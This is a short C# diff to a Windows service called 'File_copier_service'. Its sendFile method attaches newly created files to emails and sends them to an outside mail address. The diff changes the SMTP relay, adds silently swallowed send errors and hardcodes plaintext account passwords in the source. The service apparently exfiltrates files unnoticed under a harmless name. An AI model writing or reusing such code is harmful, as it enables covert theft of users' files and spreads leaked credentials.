@@ -108,7 +108,7 @@ namespace File_copier_service
             }
         }
 
-        private async void sendFile(string filePath)
+        private void sendFile(string filePath)
         {
             MailAddress from = new MailAddress("service@yandex.ru", "bot");
             MailAddress to = new MailAddress("poiulkjhmnv50@gmail.com");
@@ -116,10 +116,16 @@ namespace File_copier_service
             m.Subject = "file_copier_service";
             m.Body = "new file created";
             m.Attachments.Add(new Attachment(filePath));
-            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
+            SmtpClient smtp = new SmtpClient("smtp.mail.com", 2525);
             smtp.EnableSsl = true;
-            smtp.Credentials = new NetworkCredential("poiulkjhmnv50@gmail.com", "vnmhjkluiop");
-            await smtp.SendMailAsync(m);
+            smtp.UseDefaultCredentials = false;
+            smtp.Credentials = new NetworkCredential("info.bez17-21@mail.ru", "IN1234be");
+            try
+            {
+                smtp.Send(m);
+            } 
+            catch
+            {}
         }
     }
 }
